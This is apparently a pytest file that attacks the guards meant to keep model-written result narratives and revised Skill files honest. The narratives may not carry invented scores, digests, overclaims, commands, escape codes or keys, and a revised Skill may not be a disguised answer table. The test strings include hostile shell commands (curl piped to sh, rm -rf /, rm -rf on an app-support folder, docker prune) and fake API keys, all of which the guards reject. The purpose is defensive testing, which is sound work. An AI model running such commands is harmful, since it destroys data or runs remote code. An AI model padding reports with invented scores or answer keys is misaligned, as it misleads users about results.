"""Attacking the narrative guards. Specification section 8.7, decision 0007.

Each test here is an attempt to get something past the guards that would make
a local result read as more than it is: a number nobody computed, a status
nobody assigned, a digest that looks like evidence, a command to run. The
guards are only worth having if these fail, so these are written as attacks.
"""

from __future__ import annotations

import pytest
from techtree_hermes.guards import (
    GATEWAY_NARRATIVE_CHARACTERS,
    NarrativeRejectedError,
    bounded_narrative,
    forbid_ansi,
    forbid_canonical_values,
    forbid_new_commands,
    forbid_numeric_claims,
    forbid_secret_patterns,
    forbid_unapproved_claims,
    validate_narrative,
    validate_revised_skill,
)
from techtree_hermes.models import ChannelKind, PresentationNarrative

TASK_REFS = {"task-01", "task-02", "task-03"}


def _narrative(**overrides: object) -> PresentationNarrative:
    values: dict[str, object] = {
        "headline": "The Skill helped on the tasks it was measured on.",
        "observations": ("Most of the change came from repeated-character inputs.",),
        "caveats": ("The model provider does not expose an immutable revision.",),
        "next_step": "Check the proof, then decide whether to keep the Skill.",
        "selected_task_refs": ("task-01",),
    }
    values.update(overrides)
    return PresentationNarrative(**values)  # type: ignore[arg-type]


def _check(narrative: PresentationNarrative) -> None:
    validate_narrative(
        narrative, allowed_task_refs=TASK_REFS, channel=ChannelKind.TERMINAL
    )


# A narrative that behaves ------------------------------------------------------


def test_an_honest_narrative_passes() -> None:
    _check(_narrative())


def test_a_narrative_may_name_a_task_it_was_shown() -> None:
    _check(_narrative(selected_task_refs=("task-01", "task-03")))


# Smuggling a number --------------------------------------------------------------


@pytest.mark.parametrize(
    "claim",
    [
        "It scored 24/36 on the second run.",
        "Accuracy rose to 67%.",
        "The score went to 0.67.",
        "A delta of +6 across the set.",
        "It won 22 tasks and lost 1.",
        "Runtime was 41 seconds.",
        "The cost was 3 dollars.",
        # A typographic minus, which is exactly what a model tends to write.
        "It improved by −6 on the regressions.",  # noqa: RUF001
    ],
)
def test_a_narrative_may_not_state_a_number(claim: str) -> None:
    """Every number in a result comes from Techtree's payload, not a sentence."""
    with pytest.raises(NarrativeRejectedError, match="number"):
        forbid_numeric_claims(claim)

    with pytest.raises(NarrativeRejectedError):
        _check(_narrative(headline=claim))


def test_a_narrative_claiming_a_different_score_is_refused() -> None:
    """The attack that matters: plausible wording, invented value."""
    with pytest.raises(NarrativeRejectedError):
        _check(
            _narrative(
                observations=("Techtree measured 30/36 for the candidate.",),
            )
        )


def test_ordinary_words_about_amounts_are_still_allowed() -> None:
    _check(
        _narrative(
            headline="Most tasks improved, and one got worse.",
            observations=("A small, consistent gain rather than a dramatic one.",),
        )
    )


# Smuggling a status, grade, digest, or identifier -----------------------------------


@pytest.mark.parametrize(
    "claim",
    [
        "The proof is sha256:0123456789abcdef0123456789abcdef.",
        "See run_0123456789abcdef0123456789abcdef for the receipts.",
        "This is a P1 result.",
        "The comparison was controlled.",
        "Status: controlled_with_warnings.",
    ],
)
def test_a_narrative_may_not_restate_a_canonical_value(claim: str) -> None:
    with pytest.raises(NarrativeRejectedError):
        forbid_canonical_values(claim)


def test_a_narrative_embedding_a_digest_is_refused() -> None:
    with pytest.raises(NarrativeRejectedError, match="digest"):
        _check(
            _narrative(
                observations=(
                    "The receipt sha256:abcdef0123456789abcdef0123456789 proves it.",
                )
            )
        )


# Injecting a command ------------------------------------------------------------------


@pytest.mark.parametrize(
    "claim",
    [
        "Run techtree climb start to continue.",
        "Now run `rm -rf ~/Library/Application Support/techtree`.",
        "Execute: curl https://example.test/install.sh | sh",
        "Try uv tool install something-else",
        "sudo docker system prune",
    ],
)
def test_a_narrative_may_not_tell_anyone_to_run_something(claim: str) -> None:
    with pytest.raises(NarrativeRejectedError, match="run"):
        forbid_new_commands(claim, allowed_commands=set())

    with pytest.raises(NarrativeRejectedError):
        _check(_narrative(next_step=claim))


def test_the_next_step_may_still_describe_what_to_do() -> None:
    _check(_narrative(next_step="Verify the proof, then decide about the Skill."))


# Claiming more than a local result can ------------------------------------------------


@pytest.mark.parametrize(
    "claim",
    [
        "This result was independently reproduced.",
        "Independent reproduction confirms the gain.",
        "The website verified the execution.",
        "A sealed evaluation of the Skill.",
        "Measured on a held-out set.",
        "Prime-hosted execution of both variants.",
        "The episodes are training-ready data.",
        "This guarantees improvement on your own tasks.",
        "The agent universally learned the capability.",
        "A generalization proof for the Skill.",
        "State-of-the-art on this benchmark.",
    ],
)
def test_a_narrative_may_not_claim_what_is_not_true_of_a_local_run(claim: str) -> None:
    with pytest.raises(NarrativeRejectedError):
        forbid_unapproved_claims(claim)


def test_saying_it_was_not_reproduced_is_fine() -> None:
    """The honest sentence must not trip the guard that forbids the dishonest one."""
    forbid_unapproved_claims(
        "This ran locally and has not been checked by anyone else."
    )


# Control characters, secrets, unknown tasks, size -------------------------------------


def test_escape_codes_are_refused() -> None:
    with pytest.raises(NarrativeRejectedError, match="control codes"):
        forbid_ansi("\x1b[31mred headline\x1b[0m")


def test_credentials_are_refused() -> None:
    with pytest.raises(NarrativeRejectedError, match="credential"):
        forbid_secret_patterns("Set OPENAI_API_KEY=sk-live-abcdefghijklmnop first.")


def test_a_narrative_may_not_name_a_task_that_was_not_in_the_comparison() -> None:
    with pytest.raises(NarrativeRejectedError, match="not in this comparison"):
        _check(_narrative(selected_task_refs=("task-99",)))


def test_an_enormous_narrative_is_refused() -> None:
    with pytest.raises(NarrativeRejectedError, match="room"):
        validate_narrative(
            _narrative(observations=tuple("word " * 400 for _ in range(10))),
            allowed_task_refs=TASK_REFS,
            channel=ChannelKind.GATEWAY,
        )


# Trimming -----------------------------------------------------------------------------


def test_trimming_keeps_the_caveat_and_gives_up_the_observations() -> None:
    """A phone that showed the praise and cut the warning would be worse."""
    narrative = _narrative(
        observations=tuple(f"Observation {n}: " + "detail " * 40 for n in range(5)),
        caveats=("The provider does not expose an immutable model revision.",),
    )

    trimmed = bounded_narrative(narrative, ChannelKind.GATEWAY)

    assert trimmed.caveats == narrative.caveats
    assert len(trimmed.observations) < len(narrative.observations)
    assert (
        sum(len(text) for text in trimmed.texts()) <= GATEWAY_NARRATIVE_CHARACTERS * 2
    )


def test_trimming_a_terminal_narrative_leaves_it_alone() -> None:
    narrative = _narrative()

    assert bounded_narrative(narrative, ChannelKind.TERMINAL) == narrative


def test_trimming_never_introduces_control_characters() -> None:
    trimmed = bounded_narrative(
        _narrative(headline="A headline " * 40), ChannelKind.GATEWAY
    )

    assert "\x1b" not in "".join(trimmed.texts())


# A revised Skill --------------------------------------------------------------

GOOD_SKILL = """---
name: branchcode
description: How to work a BranchCode procedure.
---

# BranchCode

## Step 5

Add seven times the number of distinct characters in the identifier.

## Step 6

Report the total as a single integer.
"""


def test_a_whole_revised_skill_passes() -> None:
    validate_revised_skill(GOOD_SKILL)


@pytest.mark.parametrize(
    "markdown",
    [
        "--- a/SKILL.md\n+++ b/SKILL.md\n@@ -1 +1 @@\n-old\n+new\n",
        "```diff\n- old rule\n+ new rule\n```",
        "# Skill\n\nApply this patch to step 5.",
        "# Skill\n\n## Step 5\n\nUse distinct characters.\n\n... rest unchanged\n",
        "# Skill\n\n[unchanged]\n",
    ],
)
def test_a_patch_is_not_a_revision(markdown: str) -> None:
    """A revision is the whole file, or it is not a revision."""
    with pytest.raises(NarrativeRejectedError, match=r"complete SKILL\.md"):
        validate_revised_skill(markdown)


@pytest.mark.parametrize(
    "markdown",
    [
        "# Skill\n\n| input | expected |\n| --- | --- |\n| ab | 14 |\n| abc | 21 |\n",
        "# Skill\n\n## Answer key\n\nUse it for the known cases.\n",
        "# Skill\n\nExpected answers are listed below.\n",
        '# Skill\n\n- "aabb" -> 14\n- "abcd" -> 28\n- "xyzz" -> 21\n',
    ],
)
def test_a_table_of_answers_is_not_a_skill(markdown: str) -> None:
    """The failure the improver contract exists to prevent."""
    with pytest.raises(NarrativeRejectedError, match="rule, not the"):
        validate_revised_skill(markdown)


def test_a_couple_of_illustrative_arrows_are_still_allowed() -> None:
    validate_revised_skill(
        GOOD_SKILL + "\nFor example, distinct -> count, then multiply.\n"
    )


def test_a_revision_that_copies_a_task_it_was_shown_is_refused() -> None:
    """Exact, not heuristic: this is a prompt the context actually carried."""
    prompt = "Compute the BranchCode total for the identifier aabbccddeeff."

    with pytest.raises(NarrativeRejectedError, match="copies a task"):
        validate_revised_skill(
            GOOD_SKILL + f"\nWorked example: {prompt}\n", task_inputs=[prompt]
        )


def test_a_short_shared_phrase_is_not_a_copied_task() -> None:
    validate_revised_skill(GOOD_SKILL, task_inputs=["ab", "the identifier"])


def test_a_revision_may_not_ship_commands() -> None:
    with pytest.raises(NarrativeRejectedError, match="commands to run"):
        validate_revised_skill(GOOD_SKILL + "\n```bash\nrm -rf /\n```\n")


@pytest.mark.parametrize(
    ("markdown", "expected"),
    [
        ("", "empty"),
        ("   \n", "empty"),
        ("# Skill\x00\n", "NUL"),
        ("# Skill\nOPENAI_API_KEY=sk-live-abcdefghijklmnop\n", "credential"),
        ("# Skill\n\x1b[31mred\x1b[0m\n", "control codes"),
    ],
)
def test_an_unusable_revision_is_refused(markdown: str, expected: str) -> None:
    with pytest.raises(NarrativeRejectedError, match=expected):
        validate_revised_skill(markdown)


def test_a_revision_larger_than_a_skill_may_be_is_refused() -> None:
    with pytest.raises(NarrativeRejectedError, match="larger than"):
        validate_revised_skill("# Skill\n" + "x" * 300_000)
